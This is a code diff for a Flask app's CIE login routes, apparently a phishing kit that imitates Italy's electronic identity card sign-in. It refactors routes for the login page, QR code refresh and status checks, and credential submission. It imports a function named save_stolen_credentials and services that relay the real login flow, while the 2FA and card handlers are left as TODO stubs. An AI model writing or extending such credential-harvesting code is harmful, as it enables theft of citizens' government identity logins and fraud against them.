@@ -1,12 +1,12 @@
-from flask import current_app, render_template, request, redirect, session, url_for
+from flask import current_app, jsonify, render_template, request, redirect, session, url_for
 from .. import auth
-from ..services.cie import access_login_page, get_new_qr_code, submit_credentials
+from ..services.cie import access_login_page, get_new_qr_code, submit_credentials, check_qr_code
 from ..services.flow import save_flow, check_login_flow
 from ..services.utils.writer import save_stolen_credentials
 
 DEFAULT_ERROR = {"title": "Error", "message": "An unexpected error occurred. Please try again later"}
 
-@auth.route("/cie", methods=["GET"])
+@auth.route("/cie_login", methods=["GET"])
 def cie_login():
     """Renders the CIE login page with QR code and handles the login flow"""
     try:
@@ -30,7 +30,24 @@ def cie_login():
         current_app.logger.exception("Unexpected error during CIE login page access")
         return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
 
-@auth.route("/cie/login_credentials", methods=["POST"])
+@auth.route("/cie_login/get_qr_code", methods=["GET"])
+def cie_login_get_qr_code():
+    """Refreshes the QR code for the CIE login page"""
+    try:
+        login_flow = check_login_flow()
+        if not login_flow:
+            return redirect(url_for("auth.cie_login"))
+
+        get_new_qr_code(login_flow)
+
+        current_app.logger.info("CIE login QR refreshed")
+        return redirect(url_for("auth.cie_login"))
+
+    except Exception:
+        current_app.logger.exception("Unexpected error during CIE login QR")
+        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+
+@auth.route("/cie_login/credentials", methods=["POST"])
 def cie_login_credentials():
     """Handles the submission of CIE login credentials and manages the login flow"""
     try:
@@ -59,33 +76,32 @@ def cie_login_credentials():
         current_app.logger.exception("Unexpected error during CIE login credentials submission")
         return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
 
-@auth.route("/cie/login_2fa", methods=["POST"])
+@auth.route("/cie_login/check_qr_code", methods=["GET"])
+def cie_login_check_qr_code():
+    try:
+        current_app.logger.info("CIE login QR code check requested")
+
+        login_flow = check_login_flow()
+
+        if not login_flow:
+            return redirect(url_for("auth.cie_login"))
+
+        status = check_qr_code(login_flow)
+
+        current_app.logger.info(f"CIE login QR code status: {status}")
+        return jsonify(status), 200
+    except Exception:
+        current_app.logger.exception("Unexpected error during CIE login QR code check")
+        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+
+@auth.route("/cie_login/2fa", methods=["POST"])
 def cie_login_2fa():
     current_app.logger.info("CIE login 2FA submitted")
     # TODO: Implement the logic to handle the 2FA process
     return render_template("cie.html")
 
-@auth.route("/cie/qr", methods=["GET", "POST"])
-def cie_login_qr():
-    try:
-        login_flow = check_login_flow()
-        if not login_flow:
-            return redirect(url_for("auth.cie_login"))
 
-        if request.method == "POST":
-            current_app.logger.info("CIE login QR scanned")
-            # TODO: Implement the logic to handle the QR code scanning and authentication process
-            return render_template("cie.html"), 200
-
-        get_new_qr_code(login_flow)
-        current_app.logger.info("CIE login QR refreshed")
-        return redirect(url_for("auth.cie_login"))
-
-    except Exception:
-        current_app.logger.exception("Unexpected error during CIE login QR")
-        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
-
-@auth.route("/cie/login_card", methods=["GET"])
+@auth.route("/cie_login/card", methods=["GET"])
 def cie_login_card():
     current_app.logger.info("CIE login card")
     # TODO: Implement the logic to handle the card login process
